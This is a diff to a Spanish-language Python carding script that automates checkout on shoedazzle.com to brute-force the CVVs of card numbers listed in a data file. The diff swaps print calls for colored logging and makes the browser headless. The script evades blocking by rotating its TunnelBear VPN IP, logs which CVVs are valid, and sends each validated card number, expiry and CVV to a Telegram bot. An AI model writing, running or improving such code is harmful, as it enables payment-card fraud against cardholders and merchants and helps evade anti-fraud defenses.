@@ -9,9 +9,38 @@ from pathlib import Path
 from playwright.sync_api import sync_playwright
 from colorama import Fore, Style, init
 import subprocess
+import logging
 
 # Inicializa colorama para Windows
 init(autoreset=True)
+
+class ColorFormatter(logging.Formatter):
+    COLORS = {
+        logging.DEBUG: Fore.CYAN,
+        logging.INFO: Fore.GREEN,
+        logging.WARNING: Fore.YELLOW,
+        logging.ERROR: Fore.RED,
+        logging.CRITICAL: Fore.RED + Style.BRIGHT,
+    }
+    RESET = Style.RESET_ALL
+
+    def format(self, record):
+        color = self.COLORS.get(record.levelno, "")
+        msg = super().format(record)
+        return f"{color}{msg}{self.RESET}"
+
+# Logging setup
+file_handler = logging.FileHandler("app.log", mode="a")
+file_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
+
+console_handler = logging.StreamHandler()
+console_handler.setFormatter(ColorFormatter("%(asctime)s [%(levelname)s] %(message)s"))
+
+logging.basicConfig(
+    level=logging.INFO,
+    handlers=[file_handler, console_handler]
+)
+logger = logging.getLogger(__name__)
 
 # Constantes de archivos
 DATA_FILE = "DATA.txt"
@@ -49,16 +78,16 @@ def check_health_shoedazzlepage(url="https://www.shoedazzle.com/"):
                 context.close()
                 browser.close()
             if status == 200:
-                print("Página accesible, status 200.")
+                logger.warning("Página accesible, status 200.")
                 break
             else:
-                print(f"Error al acceder a la página (status: {status}), reiniciando IP...")
+                logger.warning(f"Error al acceder a la página (status: {status}), reiniciando IP...")
                 toggle_tunnelbear()
                 time.sleep(3)
                 toggle_tunnelbear()
                 time.sleep(15)
         except Exception as e:
-            print(f"Error al acceder a la página o ejecutar el script de TunnelBear: {e}")
+            logger.error(f"Error al acceder a la página o ejecutar el script de TunnelBear: {e}")
 
 def enviar_mensaje(mensaje):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -109,7 +138,6 @@ def remover_tarjeta_de_data(numero, mes, ano):
         return
     with open(DATA_FILE, "r") as f:
         lineas = f.readlines()
-    # No es necesario asegurar aquí, porque si no existe, ya retorna antes
     with open(DATA_FILE, "w") as f:
         for linea in lineas:
             if f"{numero}|{mes}|{ano}" not in linea:
@@ -192,15 +220,14 @@ def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria
         return evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos)
 
     except Exception as e:
-        print(f"Error en editar_y_rellenar_pago: {e}")
+        logger.error(f"Error en editar_y_rellenar_pago: {e}")
         return None
 
 
 def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos):
     """Evalúa el resultado del intento de CVV y toma acciones según el mensaje recibido."""
-    
     if CVV_DOES_NOT_MATCH in mensaje or page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
-        print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
+        logger.error(f"{numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO")
         ensure_file_exists(CVV_INVALIDOS_FILE)
         with open(CVV_INVALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
@@ -208,35 +235,35 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         if int(siguiente) <= 999 and intento < max_intentos:
             return siguiente
         elif intento >= max_intentos:
-            print("Se alcanzó el máximo de intentos de CVV.")
+            logger.warning("Se alcanzó el máximo de intentos de CVV.")
             return "MAX_INTENTOS"
         else:
-            print("Todos los CVVs posibles han sido probados sin éxito.")
+            logger.warning("Todos los CVVs posibles han sido probados sin éxito.")
         return None
 
     if "declined" in mensaje or page.get_by_text(TRANSACTION_DECLINED).is_visible():
-        print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO ✅" + Style.RESET_ALL)
+        logger.info(f"{numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO ✅")
         ensure_file_exists(CVV_VALIDOS_FILE)
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         remover_tarjeta_de_data(numero, mes, ano)
         enviar_mensaje(f"{numero}|{mes}|{ano}|{cvv} - CVV CORRECTO ✅")
-        print(Fore.YELLOW + f"[{numero}] Instancia detenida tras encontrar CVV válido" + Style.RESET_ALL)
+        logger.info(f"[{numero}] Instancia detenida tras encontrar CVV válido")
         exit(0)
 
     if page.get_by_text("verify your payment information").is_visible():
-        print("TARJETA BLOQUEADA: DEAD")
+        logger.warning("TARJETA BLOQUEADA: DEAD")
         return None
 
     if page.get_by_text("contact your bank to release the hold").is_visible():
-        print(Fore.YELLOW + f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}" + Style.RESET_ALL)
+        logger.warning(f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}")
         ensure_file_exists(CVV_VALIDOS_FILE)
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
         return None
     
     if "There was an error while processing your request" in mensaje or page.get_by_text("There was an error while processing your request").is_visible():
-        print(Fore.YELLOW + f"RESET IP TUNNEL BEAR SERVICE: {cvv}" + Style.RESET_ALL)
+        logger.warning(f"RESET IP TUNNEL BEAR SERVICE: {cvv}")
         return "IP_INVALID"
 
 
@@ -295,7 +322,6 @@ def ensure_file_exists(filepath):
 
 def obtener_cvv_inicial(numero, mes, ano):
     """Permite al usuario elegir iniciar desde el siguiente CVV, desde 001 o ingresar uno manualmente, siempre."""
-    # Solo lectura, no es necesario asegurar aquí
     ultimo_cvv = None
     if os.path.exists(CVV_INVALIDOS_FILE):
         cvv_pattern = re.compile(rf"^{re.escape(numero)}\|{mes}\|{ano}\|(\d{{3}})$")
@@ -311,48 +337,44 @@ def obtener_cvv_inicial(numero, mes, ano):
             ultimo_cvv = str(max_cvv).zfill(3)
 
     if ultimo_cvv:
-        print(Fore.YELLOW + f"Último CVV inválido encontrado para la tarjeta: {ultimo_cvv}" + Style.RESET_ALL)
-        print(Fore.CYAN + "Opciones:" + Style.RESET_ALL)
-        print(Fore.CYAN + "[S] Iniciar desde el siguiente CVV" + Style.RESET_ALL)
-        print(Fore.CYAN + "[M] Ingresar uno manualmente" + Style.RESET_ALL)
+        logger.warning(f"Último CVV inválido encontrado para la tarjeta: {ultimo_cvv}")
+        logger.warning("Opciones: [S] Iniciar desde el siguiente CVV, [M] Ingresar uno manualmente")
         while True:
-            opcion = input(Fore.GREEN + "¿Desea iniciar desde el siguiente CVV (S) o ingresar uno manualmente (M)? [S/M]: " + Style.RESET_ALL).strip().lower()
+            opcion = input("¿Desea iniciar desde el siguiente CVV (S) o ingresar uno manualmente (M)? [S/M]: ").strip().lower()
             if opcion in ('s', 'm'):
                 break
             else:
-                print(Fore.RED + "Opción inválida. Por favor, elija 'S' o 'M'." + Style.RESET_ALL)
+                logger.error("Opción inválida. Por favor, elija 'S' o 'M'.")
         if opcion == 'm':
             while True:
-                cvv_manual = input(Fore.GREEN + "Ingrese el CVV inicial (3 dígitos): " + Style.RESET_ALL).strip()
+                cvv_manual = input("Ingrese el CVV inicial (3 dígitos): ").strip()
                 if cvv_manual.isdigit() and len(cvv_manual) == 3:
                     return cvv_manual
                 else:
-                    print(Fore.RED + "CVV inválido. Debe ser un número de 3 dígitos." + Style.RESET_ALL)
+                    logger.error("CVV inválido. Debe insertar un número de 3 dígitos.")
         siguiente = str(int(ultimo_cvv) + 1).zfill(3)
         if int(siguiente) <= 999:
             return siguiente
         else:
-            print(Fore.RED + "No hay más CVVs disponibles para probar." + Style.RESET_ALL)
+            logger.warning("No hay más CVVs disponibles para probar.")
             return None
     else:
-        print(Fore.YELLOW + "No se encontraron CVVs inválidos previos para esta tarjeta." + Style.RESET_ALL)
-        print(Fore.CYAN + "Opciones:" + Style.RESET_ALL)
-        print(Fore.CYAN + "[D] Iniciar desde 001 (por defecto)" + Style.RESET_ALL)
-        print(Fore.CYAN + "[M] Ingresar uno manualmente" + Style.RESET_ALL)
+        logger.warning("No se encontraron CVVs inválidos previos para esta tarjeta.")
+        logger.warning("Opciones: [D] Iniciar desde 001 (por defecto), [M] Ingresar uno manualmente")
         while True:
-            opcion = input(Fore.GREEN + "¿Desea iniciar desde 001 (D) o ingresar uno manualmente (M)? [D/M]: " + Style.RESET_ALL).strip().lower()
+            opcion = input("¿Desea iniciar desde 001 (D) o ingresar uno manualmente (M)? [D/M]: ").strip().lower()
             if opcion in ('d', 'm'):
                 break
             else:
-                print(Fore.RED + "Opción inválida. Por favor, elija 'D' o 'M'." + Style.RESET_ALL)
+                logger.error("Opción inválida. Por favor, elija 'D' o 'M'.")
         if opcion == 'm':
             while True:
-                cvv_manual = input(Fore.GREEN + "Ingrese el CVV inicial (3 dígitos): " + Style.RESET_ALL).strip()
+                cvv_manual = input("Ingrese el CVV inicial (3 dígitos): ").strip()
                 if cvv_manual.isdigit() and len(cvv_manual) == 3:
                     return cvv_manual
                 else:
-                    print(Fore.RED + "CVV inválido. Debe ser un número de 3 dígitos." + Style.RESET_ALL)
-        print(Fore.YELLOW + "Iniciando desde 001." + Style.RESET_ALL)
+                    logger.error("CVV inválido. Debe ser un número de 3 dígitos.")
+        logger.info("Iniciando desde 001.")
         return "001"
 
 
@@ -360,10 +382,9 @@ def procesar_tarjeta(tarjeta_linea):
     """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
     numero, mes, ano = tarjeta_linea.split("|")
     chrome_path = get_chrome_path()
-    # No es necesario asegurar aquí, solo se asegura al escribir
     start_cvv = obtener_cvv_inicial(numero, mes, ano)
     if not start_cvv:
-        print("No se puede iniciar el proceso para esta tarjeta.")
+        logger.warning("No se puede iniciar el proceso para esta tarjeta.")
         return
     max_intentos = 6
     cvv_actual = start_cvv
@@ -371,27 +392,27 @@ def procesar_tarjeta(tarjeta_linea):
     while cvv_actual:
         check_health_shoedazzlepage()
         with sync_playwright() as p:
-            browser = p.chromium.launch(headless=False, executable_path=chrome_path)
+            browser = p.chromium.launch(headless=True, executable_path=chrome_path)
             context = browser.new_context()
             page = context.new_page()
             try:
                 iniciar_checkout(page, email)
                 next_cvv = lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos)
             except Exception as e:
-                print(f"[{numero}] Error: {e}")
+                logger.error(f"[{numero}] Error: {e}")
                 next_cvv = None
             finally:
                 context.close()
                 browser.close()
         if next_cvv:
-            print("Restarting IP Service...")
+            logger.warning("Restarting IP Service...")
             try:
                 toggle_tunnelbear()
                 time.sleep(3)
                 toggle_tunnelbear()
                 time.sleep(15)
             except Exception as e:
-                print(f"Error al ejecutar el script AHK: {e}")
+                logger.error(f"Error al ejecutar el script AHK: {e}")
             cvv_actual = next_cvv
             email = generar_email()
         else:
@@ -400,7 +421,7 @@ def procesar_tarjeta(tarjeta_linea):
 def cargar_tarjetas_disponibles():
     """Carga todas las tarjetas disponibles desde DATA.txt."""
     if not os.path.exists(DATA_FILE):
-        print("DATA.txt no existe")
+        logger.warning("DATA.txt no existe")
         return []
     with open(DATA_FILE, "r") as f:
         return [line.strip() for line in f if "|" in line]
@@ -412,7 +433,6 @@ def cargar_tarjetas_validadas():
     with open(CVV_VALIDOS_FILE, "r") as f:
         return set(line.strip().split("|")[0] for line in f if "|" in line)
 
-            
 def main():
     tarjetas = cargar_tarjetas_disponibles()
     if not tarjetas:
@@ -420,23 +440,21 @@ def main():
 
     tarjetas_usadas = set()
     max_tarjetas = min(15, len(tarjetas))
-    
 
     for i in range(max_tarjetas):
         tarjeta = tarjetas[i]
         tarjetas_usadas.add(tarjeta)
-        print(f"[INFO] Procesando tarjeta {i+1}/{max_tarjetas}: {tarjeta}")
+        logger.info(f"Procesando tarjeta {i+1}/{max_tarjetas}: {tarjeta}")
         procesar_tarjeta(tarjeta)
         tarjetas_validadas = cargar_tarjetas_validadas()
         numero = tarjeta.split("|")[0]
         if numero in tarjetas_validadas:
-            print(f"[INFO] Se encontró CVV válido para {tarjeta}. Pasando a la siguiente tarjeta disponible.")
+            logger.info(f"Se encontró CVV válido para {tarjeta}. Pasando a la siguiente tarjeta disponible.")
         else:
-            print(f"[INFO] No se encontró CVV válido para {tarjeta}. Reintentando la misma tarjeta.")
+            logger.info(f"No se encontró CVV válido para {tarjeta}. Reintentando la misma tarjeta.")
             procesar_tarjeta(tarjeta)
 
-    print("[INFO] Proceso secuencial finalizado. No quedan más tarjetas disponibles o todas han sido procesadas.")
-    
-    
+    logger.info("Proceso secuencial finalizado. No quedan más tarjetas disponibles o todas han sido procesadas.")
+
 if __name__ == "__main__":
     main()
